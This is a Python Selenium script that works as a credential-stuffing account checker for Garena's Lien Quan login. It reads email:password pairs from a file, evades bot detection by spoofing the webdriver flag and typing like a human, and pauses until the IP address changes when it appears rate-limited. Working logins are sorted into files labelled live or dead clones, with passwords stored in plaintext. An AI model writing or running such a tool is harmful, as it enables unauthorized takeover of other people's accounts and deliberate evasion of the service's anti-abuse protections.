import time
import csv
import random
import json
import os
import threading
import socket
import unicodedata
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from colorama import init, Fore, Style

# Kh·ªüi t·∫°o colorama
init(autoreset=True)

class GarenaAccountChecker:
    def __init__(self):
        self.results = []
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.total_accounts = 0
        self.clonelive_total_current = 0

    def log_progress(self, message, color=Fore.MAGENTA):
        """In ra th√¥ng tin ti·∫øn tr√¨nh k√®m timestamp ƒë·ªÉ d·ªÖ theo d√µi."""
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Style.RESET_ALL}")

    def alert_user(self, stop_event):
        """Ph√°t √¢m thanh c·∫£nh b√°o li√™n t·ª•c cho ƒë·∫øn khi ƒë∆∞·ª£c y√™u c·∫ßu d·ª´ng."""
        try:
            import winsound
            pattern = [(800, 250), (1000, 250), (1200, 250), (1000, 250)]
            while not stop_event.is_set():
                for freq, duration in pattern:
                    if stop_event.is_set():
                        break
                    winsound.Beep(freq, duration)
                    if stop_event.is_set():
                        break
                    time.sleep(0.05)
        except Exception:
            while not stop_event.is_set():
                print('\a', end='', flush=True)
                time.sleep(0.2)

    def get_current_ip(self):
        """Return current outward-facing IP if detectable."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect(("8.8.8.8", 80))
                return sock.getsockname()[0]
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return None

    def wait_for_ip_change(self, original_ip, check_interval=0.5):
        """Pause execution until the network IP changes."""
        baseline = original_ip
        if baseline:
            self.log_progress(
                f"Tam dung cho den khi IP thay doi (hien tai: {baseline}).",
                Fore.YELLOW
            )
        else:
            self.log_progress(
                "Chua xac dinh duoc IP hien tai. Dang thu lai...",
                Fore.YELLOW
            )

        while True:
            current_ip = self.get_current_ip()
            if baseline:
                if current_ip and current_ip != baseline:
                    self.log_progress(
                        f"Phat hien IP moi: {current_ip}.",
                        Fore.GREEN
                    )
                    return current_ip
            else:
                if current_ip:
                    baseline = current_ip
                    self.log_progress(
                        f"Da xac dinh IP hien tai: {baseline}. Cho doi IP moi...",
                        Fore.YELLOW
                    )
            time.sleep(check_interval)

    def normalize_text(self, text):
        """Return lowercase text with diacritics removed for keyword matching."""
        if not text:
            return ""
        normalized = unicodedata.normalize("NFD", text)
        stripped = "".join(ch for ch in normalized if unicodedata.category(ch) != "Mn")
        return stripped.lower()

    def setup_driver(self):
        """C·∫•u h√¨nh v√† kh·ªüi t·∫°o tr√¨nh duy·ªát Chrome th·∫≠t tr√™n m√°y"""
        self.log_progress("ƒêang c·∫•u h√¨nh v√† kh·ªüi t·∫°o tr√¨nh duy·ªát Chrome...", Fore.YELLOW)
        options = Options()
        options.add_argument("--incognito")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("detach", True)

        # üëâ ch·ªâ ƒë·ªãnh ƒë∆∞·ªùng d·∫´n chrome.exe tr√™n m√°y b·∫°n
        options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

        try:
            driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()),
                options=options
            )
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.log_progress("Kh·ªüi t·∫°o tr√¨nh duy·ªát th√†nh c√¥ng.", Fore.GREEN)
            return driver
        except Exception as e:
            self.log_progress(f"L·ªói khi kh·ªüi t·∫°o tr√¨nh duy·ªát: {e}", Fore.RED)
            return None

    def type_like_human(self, element, text):
        """G√µ ph√≠m gi·ªëng ng∆∞·ªùi th·∫≠t"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def remove_account_from_source(self, email, password, file_path="accounts.txt"):
        """Xoa tai khoan khoi file nguon de tranh kiem tra lai."""
        try:
            if not os.path.exists(file_path):
                return
            target = f"{email}:{password}"
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            filtered = [line for line in lines if line.strip() != target]
            if len(filtered) != len(lines):
                with open(file_path, "w", encoding="utf-8") as f:
                    f.writelines(filtered)
                self.log_progress(f"Da xoa {email} khoi {file_path}.", Fore.YELLOW)
        except Exception as e:
            self.log_progress(f"Khong the xoa {email} khoi {file_path}: {e}", Fore.YELLOW)


    def check_account(self, email, password):
        """Ki·ªÉm tra m·ªôt t√†i kho·∫£n Garena"""
        self.log_progress(f"B·∫Øt ƒë·∫ßu ki·ªÉm tra t√†i kho·∫£n: {email}", Fore.CYAN)
        driver = self.setup_driver()
        if not driver:
            return False, "Kh√¥ng th·ªÉ kh·ªüi t·∫°o tr√¨nh duy·ªát"

        try:
            login_url = "https://auth.garena.com/universal/oauth?client_id=100054&redirect_uri=https%3A%2F%2Fkientuong.lienquan.garena.vn%2Fauth%2Flogin%2Fcallback&response_type=code&"
            self.log_progress("ƒêang m·ªü trang ƒëƒÉng nh·∫≠p...", Fore.CYAN)
            start_time = time.time()
            driver.get(login_url)
            load_time = time.time() - start_time
            self.log_progress(f"ƒê√£ m·ªü trang ƒëƒÉng nh·∫≠p trong {load_time:.2f} gi√¢y.", Fore.CYAN)

            try:
                self.log_progress("ƒêang ch·ªù form ƒëƒÉng nh·∫≠p xu·∫•t hi·ªán...", Fore.CYAN)
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "input"))
                )
                self.log_progress("ƒê√£ ph√°t hi·ªán form ƒëƒÉng nh·∫≠p.", Fore.GREEN)
            except Exception:
                current_url = driver.current_url.lower()
                if "blog" in current_url:
                    self.log_progress("Trang ƒëƒÉng nh·∫≠p chuy·ªÉn sang blog - c√≥ th·ªÉ b·ªã ch·∫∑n.", Fore.RED)
                    return False, "T√†i kho·∫£n b·ªã ch·∫∑n (blog)"
                if "access" in current_url:
                    self.log_progress("Trang th√¥ng b√°o access - c√≥ th·ªÉ b·ªã ch·∫∑n IP.", Fore.RED)
                    return False, "IP b·ªã ch·∫∑n t·∫°m th·ªùi"
                if "block" in current_url:
                    self.log_progress("Trang th√¥ng b√°o block - c√≥ th·ªÉ b·ªã ch·∫∑n IP.", Fore.RED)
                    return False, "IP b·ªã ch·∫∑n, vui l√≤ng th·ª≠ l·∫°i sau"
                self.log_progress("Kh√¥ng t√¨m th·∫•y form ƒëƒÉng nh·∫≠p.", Fore.RED)
                return False, "Kh√¥ng t√¨m th·∫•y form ƒëƒÉng nh·∫≠p"

            self.log_progress("ƒêang chu·∫©n b·ªã nh·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p...", Fore.CYAN)
            inputs = driver.find_elements(By.TAG_NAME, "input")
            if len(inputs) < 2:
                self.log_progress("Kh√¥ng t√¨m th·∫•y ƒë·ªß tr∆∞·ªùng nh·∫≠p li·ªáu.", Fore.RED)
                return False, "Kh√¥ng t√¨m th·∫•y ƒë·ªß tr∆∞·ªùng nh·∫≠p li·ªáu"

            email_field = inputs[0]
            email_field.clear()
            self.log_progress("ƒêang nh·∫≠p email...", Fore.CYAN)
            self.type_like_human(email_field, email)

            email_field.send_keys(Keys.TAB)
            time.sleep(0.5)

            password_field = driver.switch_to.active_element
            self.log_progress("ƒêang nh·∫≠p m·∫≠t kh·∫©u...", Fore.CYAN)
            password_field.send_keys(password)

            before_login_url = driver.current_url

            self.log_progress("ƒêang g·ª≠i y√™u c·∫ßu ƒëƒÉng nh·∫≠p...", Fore.CYAN)
            password_field.send_keys(Keys.ENTER)

            self.log_progress("ƒêang ch·ªù ph·∫£n h·ªìi ƒëƒÉng nh·∫≠p...", Fore.CYAN)
            time.sleep(6)

            after_login_url = driver.current_url
            self.log_progress(f"URL sau ƒëƒÉng nh·∫≠p: {after_login_url}", Fore.CYAN)

            current_url_lower = after_login_url.lower()
            if "blog" in current_url_lower:
                self.log_progress("B·ªã chuy·ªÉn h∆∞·ªõng sang blog - t√†i kho·∫£n b·ªã ch·∫∑n.", Fore.RED)
                return False, "T√†i kho·∫£n b·ªã ch·∫∑n (blog)"
            if "access" in current_url_lower:
                self.log_progress("B·ªã ch·∫∑n t·∫°m th·ªùi do IP.", Fore.RED)
                return False, "IP b·ªã ch·∫∑n t·∫°m th·ªùi"
            if "block" in current_url_lower:
                self.log_progress("B·ªã ch·∫∑n truy c·∫≠p.", Fore.RED)
                return False, "IP b·ªã ch·∫∑n, vui l√≤ng th·ª≠ l·∫°i sau"
            if "error" in current_url_lower:
                self.log_progress("Trang b√°o l·ªói ƒëƒÉng nh·∫≠p.", Fore.RED)
                return False, "L·ªói ƒëƒÉng nh·∫≠p"

            try:
                error_div = driver.find_element(
                    By.XPATH,
                    '//div[contains(@class, "error") or contains(@class, "error-message")]'
                )

                if error_div.is_displayed():
                    error_text = error_div.text.strip()
                    lower_error = error_text.lower()
                    if "sai t√™n t√†i kho·∫£n ho·∫∑c m·∫≠t kh·∫©u" in lower_error or "username or password is incorrect." in lower_error:
                        self.log_progress("Sai m·∫≠t kh·∫©u.", Fore.YELLOW)
                        return False, "SAI_PASS"
                    if "ch∆∞a x√°c ƒë·ªãnh l·ªói sai" in lower_error or "an unknown error occured." in lower_error:
                        self.log_progress("L·ªói m·∫°ng ho·∫∑c l·ªói kh√¥ng x√°c ƒë·ªãnh.", Fore.YELLOW)
                        return False, "NOT_INTERNET"
                    self.log_progress(f"L·ªói kh√°c: {error_text}", Fore.YELLOW)
                    return False, f"L·ªói: {error_text}"
            except NoSuchElementException:
                self.log_progress("Kh√¥ng th·∫•y th√¥ng b√°o l·ªói hi·ªÉn th·ªã.", Fore.GREEN)
            except Exception as e:
                self.log_progress(f"L·ªói khi ƒë·ªçc th√¥ng b√°o l·ªói: {e}", Fore.YELLOW)

            try:
                block_element = driver.find_element(By.XPATH, "//BODY/DIV[2]/DIV[1]")
                if block_element.is_displayed():
                    self.log_progress("Phat hien trang chan dang nhap.", Fore.RED)
                    self.remove_account_from_source(email, password)
                    return False, "CANT_LOGIN"
            except NoSuchElementException:
                pass
            except Exception as e:
                self.log_progress(f"Loi khi kiem tra chan dang nhap: {e}", Fore.YELLOW)

            if before_login_url != after_login_url:
                self.log_progress("ƒêƒÉng nh·∫≠p th√†nh c√¥ng, chuy·ªÉn sang l·∫•y th√¥ng tin t√†i kho·∫£n.", Fore.GREEN)
                self.log_progress("ƒêang t·∫£i trang kientuong.lienquan...", Fore.CYAN)
                time.sleep(5)

                xpaths = [
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[1]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[2]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[3]"
                ]

                results = []
                self.log_progress("ƒêang thu th·∫≠p d·ªØ li·ªáu t√†i kho·∫£n...", Fore.CYAN)
                for xp in xpaths:
                    try:
                        element = driver.find_element(By.XPATH, xp)
                        text = element.text.strip()
                        if not text:
                            text = (element.get_attribute("innerText") or "").strip()
                        results.append(text)
                        self.log_progress(f"L·∫•y d·ªØ li·ªáu t√†i kho·∫£n {xp}.", Fore.GREEN)
                    except Exception as e:
                        results.append("")
                        self.log_progress(f"Kh√¥ng t√¨m th·∫•y {xp}: {e}", Fore.YELLOW)
                results = (results + [""] * len(xpaths))[:len(xpaths)]
                liveordie_written = False
                try:
                    line = f"{email}  ||  {password}  ||  {results[0]}  ||  {results[1]}  ||  {results[2]}\n"
                    with open("liveordie.txt", "a", encoding="utf-8") as f:
                        f.write(line)
                    liveordie_written = True
                except Exception as live_error:
                    self.log_progress(f"Kh√¥ng ghi ƒë∆∞·ª£c d·ªØ li·ªáu v√†o liveordie.txt: {live_error}", Fore.YELLOW)
                if not any(part.strip() for part in results):
                    self.log_progress("Kh√¥ng load ƒë∆∞·ª£c d·ªØ li·ªáu.", Fore.RED)
                    return False, "NO_DATA"
                status_text = results[2] if len(results) > 2 else ""
                normalized_status = self.normalize_text(status_text)
                locked_keywords = ("bi khoa", "khoa tai khoan", "khoa tam thoi")

                if "binh thuong" in normalized_status:
                    clonelive_path = "clonelive.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonelive_path):
                            with open(clonelive_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            self.clonelive_added += 1
                            added_new = True
                        self.clonelive_total_current = len(existing_accounts)
                        with open(clonelive_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        if added_new:
                            self.log_progress("Th√™m t√†i kho·∫£n B√¨nh th∆∞·ªùng clonelive.js.", Fore.GREEN)
                        else:
                            self.log_progress("Th√™m t√†i kho·∫£n B√¨nh th∆∞·ªùng trong clonelive.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Kh√¥ng th√™m t√†i kho·∫£n B√¨nh thuong clonelive.js: {clone_error}", Fore.YELLOW)
                elif any(keyword in normalized_status for keyword in locked_keywords):
                    clonedie_path = "clonedie.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonedie_path):
                            with open(clonedie_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
                                    except json.JSONDecodeError:
                                        existing_accounts = []
                        added_new = False
                        if account_entry not in existing_accounts:
                            existing_accounts.append(account_entry)
                            added_new = True
                        with open(clonedie_path, "w", encoding="utf-8") as js_file:
                            json.dump(existing_accounts, js_file, ensure_ascii=False, indent=2)
                        if added_new:
                            self.log_progress(" Th√™m t√†i kho·∫£n B·ªã kh√≥a clonedie.js.", Fore.GREEN)
                        else:
                            self.log_progress("Th√™m t√†i kho·∫£n B·ªã kh√≥a trong clonedie.js.", Fore.YELLOW)
                    except Exception as clone_error:
                        self.log_progress(f"Kh√¥ng th·ªÉ c·∫≠p nh·∫≠t t√†i kho·∫£n B·ªã kh√≥a clonedie.js: {clone_error}", Fore.YELLOW)
                # In ra terminal b·∫±ng log_progress
                self.log_progress(f"Th√¥ng tin t√†i kho·∫£n {email} || {password}", Fore.CYAN)

                # In t·ª´ng k·∫øt qu·∫£ (b·∫Øt ƒë·∫ßu t·ª´ results[1] ƒë·∫øn results[3])
                if len(results) > 1:
                    self.log_progress(f" {results[1]}")
                if len(results) > 2:
                    self.log_progress(f" {results[2]}")
                if len(results) > 3:
                    self.log_progress(f" {results[3]}")

                # Th√¥ng b√°o tr·∫°ng th√°i cu·ªëi
                if liveordie_written:
                    self.log_progress("Ghi d·ªØ li·ªáu v√†o liveordie.txt.", Fore.GREEN)
                return True, "ƒêƒÉng nh·∫≠p th√†nh c√¥ng"

            self.log_progress("URL kh√¥ng ƒë·ªïi sau ƒëƒÉng nh·∫≠p - ƒëƒÉng nh·∫≠p th·∫•t b·∫°i.", Fore.RED)
            return False, "ƒêƒÉng nh·∫≠p th·∫•t b·∫°i (kh√¥ng r√µ l√Ω do)"

        except TimeoutException:
            self.log_progress("Qu√° th·ªùi gian ch·ªù t·∫£i trang.", Fore.RED)
            return False, "L·ªói: Qu√° th·ªùi gian ch·ªù t·∫£i trang"
        except Exception as e:
            self.log_progress(f"L·ªói trong qu√° tr√¨nh ki·ªÉm tra: {e}", Fore.RED)
            return False, f"L·ªói: {str(e)}"
        finally:
            self.log_progress("ƒê√≥ng tr√¨nh duy·ªát.", Fore.YELLOW)
            driver.quit()

    def process_accounts(self, input_file, output_file):
        """X·ª≠ l√Ω danh s√°ch t√†i kho·∫£n v√† ghi tr·ª±c ti·∫øp v√†o c√°c file sau m·ªói l·∫ßn ki·ªÉm tra"""
        self.log_progress("Chu·∫©n b·ªã c√°c file k·∫øt qu·∫£ ƒë·ªÉ ghi d·ªØ li·ªáu.", Fore.YELLOW)
        valid_file = "clonepass.js"
        invalid_file = "cloneunpass.txt"
        notcheck_file = "notcheck.txt"

        try:
            with open(output_file, "r", encoding="utf-8") as f:
                pass
        except FileNotFoundError:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  M·∫≠t kh·∫©u  ||  Tr·∫°ng th√°i    ||  Th√¥ng b√°o\n")
            self.log_progress(f"T·∫°o m·ªõi file k·∫øt qu·∫£: {output_file}", Fore.GREEN)

        try:
            with open(input_file, "r", encoding="utf-8") as f:
                accounts = [line.strip().split(":", 1) for line in f if ":" in line]

            total = len(accounts)
            self.total_accounts = total
            self.log_progress(f"ƒê√£ t√¨m th·∫•y {total} t√†i kho·∫£n ƒë·ªÉ ki·ªÉm tra t·ª´ {input_file}.", Fore.CYAN)
            print(f"{Fore.YELLOW}ƒêang b·∫Øt ƒë·∫ßu ki·ªÉm tra...{Style.RESET_ALL}\n")

            pending_invalid_records = []
            invalid_streak = []

            def flush_pending_invalid():
                nonlocal pending_invalid_records, invalid_streak
                if not pending_invalid_records:
                    return
                self.log_progress(
                    f"ƒêang ghi {len(pending_invalid_records)} t√†i kho·∫£n INVALID ƒëang ch·ªù.",
                    Fore.MAGENTA
                )
                for record in pending_invalid_records:
                    email = record["email"]
                    password = record["password"]
                    message = record["message"]
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}  ||  {message}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  {message}\n")
                    self.invalid += 1
                    self.checked += 1
                    self.log_progress(
                        f"ƒê√£ c·∫≠p nh·∫≠t tr·∫°ng th√°i INVALID cho {email}.",
                        Fore.MAGENTA
                    )
                pending_invalid_records = []
                invalid_streak = []

            i = 0
            while i < total:
                account = accounts[i]
                display_idx = i + 1

                if len(account) != 2:
                    flush_pending_invalid()
                    self.log_progress(
                        f"[{display_idx}/{total}] B·ªè qua d√≤ng kh√¥ng h·ª£p l·ªá: {':'.join(account)}",
                        Fore.YELLOW
                    )
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{':'.join(account)}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{account[0]}  ||  {account[1]}  ||  INVALID  ||  D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá\n")
                    self.invalid += 1
                    self.checked += 1
                    i += 1
                    continue

                email = account[0].strip()
                password = account[1].strip()
                self.log_progress(
                    f"[{display_idx}/{total}] B·∫Øt ƒë·∫ßu ki·ªÉm tra t√†i kho·∫£n {email}",
                    Fore.CYAN
                )

                try:
                    success, message = self.check_account(email, password)

                    if success:
                        flush_pending_invalid()
                        self.valid += 1
                        with open(valid_file, "a", encoding="utf-8") as f:
                            f.write(f'{{"username": "{email}", "password": "{password}" }},\n')
                        self.log_progress(
                            f"[{display_idx}/{total}] {email} h·ª£p l·ªá - ƒë√£ ghi v√†o {valid_file}.",
                            Fore.GREEN
                        )
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(f"{email}  ||  {password}  ||  VALID  ||  {message}\n")
                        self.checked += 1
                        invalid_streak.clear()

                    else:
                        if message == "SAI_PASS":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(invalid_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} sai m·∫≠t kh·∫©u - ƒë√£ ghi v√†o {invalid_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  UNPASS  ||  {message}\n")
                            self.checked += 1
                            invalid_streak.clear()

                        elif message == "NOT_INTERNET":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  {message}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} g·∫∑p l·ªói m·∫°ng - ƒë√£ ghi v√†o {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  NOT_INTERNET  ||  {message}\n")
                            self.checked += 1
                            invalid_streak.clear()
                        elif message == "NO_DATA":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  Kh√¥ng load ƒë∆∞·ª£c d·ªØ li·ªáu\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} Kh√¥ng load ƒë∆∞·ª£c d·ªØ li·ªáu - ƒë√£ ghi v√†o {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  INVALID  ||  Kh√¥ng load ƒë∆∞·ª£c d·ªØ li·ªáu\n")
                            self.checked += 1
                            invalid_streak.clear()


                        elif message == "CANT_LOGIN":
                            flush_pending_invalid()
                            self.invalid += 1
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} bi chan dang nhap - da xoa khoi accounts.txt.",
                                Fore.RED
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  CANT_LOGIN  ||  Chan dang nhap\n")
                            self.checked += 1
                            invalid_streak.clear()

                        else:
                            invalid_streak.append({"index": i, "email": email, "password": password})
                            pending_invalid_records.append({
                                "email": email,
                                "password": password,
                                "message": message
                            })
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} tr·∫£ v·ªÅ INVALID: {message}",
                                Fore.RED
                            )

                            if len(invalid_streak) >= 3:
                                first = invalid_streak[0]["index"]
                                second = invalid_streak[1]["index"]
                                third = invalid_streak[2]["index"]
                                if third == i and second == i - 1 and first == i - 2:
                                    self.log_progress(
                                        "Ph√°t hi·ªán 3 t√†i kho·∫£n INVALID li√™n ti·∫øp. T·∫°m d·ª´ng ƒë·ªÉ ki·ªÉm tra l·∫°i.",
                                        Fore.RED
                                    )
                                    stop_event = threading.Event()
                                    alert_thread = threading.Thread(
                                        target=self.alert_user,
                                        args=(stop_event,),
                                        daemon=True
                                    )
                                    alert_thread.start()
                                    original_ip = self.get_current_ip()
                                    new_ip = self.wait_for_ip_change(original_ip, check_interval=0.5)
                                    stop_event.set()
                                    alert_thread.join()
                                    if new_ip:
                                        self.log_progress(
                                            f"Tiep tuc kiem tra sau khi IP thay doi thanh {new_ip}.",
                                            Fore.GREEN
                                        )
                                    else:
                                        self.log_progress(
                                            "Tiep tuc kiem tra du khong xac dinh duoc IP moi.",
                                            Fore.YELLOW
                                        )
                                    restart_index = first
                                    pending_invalid_records = []
                                    invalid_streak = []
                                    self.log_progress(
                                        f"Quay l·∫°i ki·ªÉm tra t·ª´ t√†i kho·∫£n th·ª© {restart_index + 1}.",
                                        Fore.YELLOW
                                    )
                                    i = restart_index
                                    continue

                    i += 1
                    delay = random.uniform(3, 7)
                    self.log_progress(f"Ngh·ªâ {delay:.2f} gi√¢y tr∆∞·ªõc khi ki·ªÉm tra t√†i kho·∫£n ti·∫øp theo.", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    time.sleep(delay)

                except KeyboardInterrupt:
                    flush_pending_invalid()
                    self.log_progress("Ng∆∞·ªùi d√πng d·ª´ng ch∆∞∆°ng tr√¨nh!", Fore.RED)
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  Ng∆∞·ªùi d√πng d·ª´ng ch∆∞∆°ng tr√¨nh\n")
                    break

            flush_pending_invalid()

        except Exception as e:
            error_msg = f"L·ªói t·ªïng: {str(e)}"
            self.log_progress(error_msg, Fore.RED)
            with open(notcheck_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")

    def save_results(self, output_file):
        """L∆∞u k·∫øt qu·∫£ ra file v·ªõi ƒë·ªãnh d·∫°ng: Email  ||  M·∫≠t kh·∫©u  ||  Tr·∫°ng th√°i    ||  Th√¥ng b√°o"""
        self.log_progress("ƒêang l∆∞u k·∫øt qu·∫£ t·ªïng h·ª£p.", Fore.YELLOW)
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  M·∫≠t kh·∫©u  ||  Tr·∫°ng th√°i    ||  Th√¥ng b√°o\n")
                for row in self.results:
                    if row[2] == "VALID":
                        f.write(f"{row[0]}  ||  {row[1]}  ||  VALID    ||  {row[3]}\n")
                    else:
                        f.write(f"{row[0]}  ||  {row[1]}  ||  {row[2]}  ||  {row[3]}\n")

            self.log_progress(f"ƒê√£ l∆∞u k·∫øt qu·∫£ v√†o {output_file}.", Fore.GREEN)
            print(f"\n{Fore.GREEN}=== K·∫æT QU·∫¢ KI·ªÇM TRA ===")
            print(f"T·ªïng s·ªë t√†i kho·∫£n ƒë√£ ki·ªÉm tra: {self.checked}")
            print(f"{Fore.GREEN}T√†i kho·∫£n h·ª£p l·ªá: {self.valid}")
            print(f"{Fore.RED}T√†i kho·∫£n kh√¥ng h·ª£p l·ªá: {self.invalid}")
            print(f"{Fore.YELLOW}K·∫øt qu·∫£ ƒë√£ ƒë∆∞·ª£c l∆∞u v√†o file: {output_file}{Style.RESET_ALL}")

        except Exception as e:
            self.log_progress(f"L·ªói khi l∆∞u k·∫øt qu·∫£: {str(e)}", Fore.RED)
            print(f"\n{Fore.RED}L·ªói khi l∆∞u k·∫øt qu·∫£: {str(e)}{Style.RESET_ALL}")

def main():
   print(f"""{Fore.CYAN}
  _______              _     ____              
 |__   __|            | |   |  _ \             
    | | ___   ___   __| |   | |_) | _   _ 
    | |/ _ \ / _ \ / _` |   |  _ < | | | |
    | | (_) | (_) | (_| |   | |_) || |_| |
    |_|\___/ \___/ \__,_|   |____/  \__, |
                                     __/ |
                                    |___/ 
         __          __   _____  
         \ \        / /  / ____| 
          \ \  /\  / /  | (___   
           \ \/  \/ /   \\\___ \  
            \  /\  /     |___) | 
             \/  \/     /_____/  

    {Style.RESET_ALL}""")


input_file = "accounts.txt"
output_file = "results.csv"

print(f"{Fore.YELLOW}ƒêang kh·ªüi t·∫°o c√¥ng c·ª• ki·ªÉm tra t√†i kho·∫£n Garena...{Style.RESET_ALL}")
checker = GarenaAccountChecker()
checker.log_progress("B·∫Øt ƒë·∫ßu quy tr√¨nh ki·ªÉm tra t√†i kho·∫£n.", Fore.YELLOW)
checker.process_accounts(input_file, output_file)
clonelive_path = "clonelive.js"
try:
    if os.path.exists(clonelive_path):
        with open(clonelive_path, "r", encoding="utf-8") as js_file:
            raw_data = js_file.read().strip()
        if raw_data:
            data = json.loads(raw_data)
            if isinstance(data, list):
                checker.clonelive_total_current = len(data)
            else:
                checker.clonelive_total_current = 0
        else:
            checker.clonelive_total_current = 0
    else:
        checker.clonelive_total_current = 0
except Exception as summary_error:
    checker.log_progress(f"Kh√¥ng ƒë·ªçc ƒë∆∞·ª£c clonelive.js ƒë·ªÉ t·ªïng k·∫øt: {summary_error}", Fore.YELLOW)
    checker.clonelive_total_current = 0
checker.log_progress(f"T·ªïng k·∫øt clonelive.js: {checker.clonelive_added}/{checker.total_accounts} t√†i kho·∫£n m·ªõi ghi (t·ªïng hi·ªán c√≥: {checker.clonelive_total_current}).", Fore.CYAN)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}ƒê√£ d·ª´ng ch∆∞∆°ng tr√¨nh do ng∆∞·ªùi d√πng y√™u c·∫ßu.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}C√≥ l·ªói kh√¥ng mong mu·ªën: {str(e)}{Style.RESET_ALL}")
